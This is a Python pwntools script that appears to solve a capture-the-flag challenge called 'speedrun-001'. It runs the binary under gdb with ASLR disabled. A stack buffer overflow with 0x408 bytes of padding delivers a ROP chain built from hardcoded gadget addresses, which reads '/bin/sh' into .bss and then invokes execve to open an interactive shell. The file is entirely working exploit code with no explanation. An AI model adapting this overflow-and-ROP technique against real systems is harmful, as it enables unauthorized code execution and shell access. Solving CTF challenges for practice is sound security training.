from pwn import *


binpath = './speedrun-001'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
pwn
b *0x4498aa
b *0x400bad
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)


addr_pop_rax = 0x415664
addr_pop_rdi = 0x400686
addr_pop_rsi = 0x4101f3
addr_pop_rdx = 0x4498b5
addr_bss = 0x6b6000
addr_syscall = 0x4498ac


rop = ''

rop += p64(addr_pop_rax)
rop += p64(0)
rop += p64(addr_pop_rdi)
rop += p64(0)
rop += p64(addr_pop_rsi)
rop += p64(addr_bss)
rop += p64(addr_pop_rdx)
rop += p64(8)
rop += p64(addr_syscall)

rop += p64(addr_pop_rax)
rop += p64(59)
rop += p64(addr_pop_rdi)
rop += p64(addr_bss)
rop += p64(addr_pop_rsi)
rop += p64(0)
rop += p64(addr_pop_rdx)
rop += p64(0)
rop += p64(addr_syscall)

payload  = 'A' * 0x408 + rop
payload += 'B' * (0x7d0 - len(payload))

io.send(payload)

io.send('/bin/sh\x00')

io.interactive()
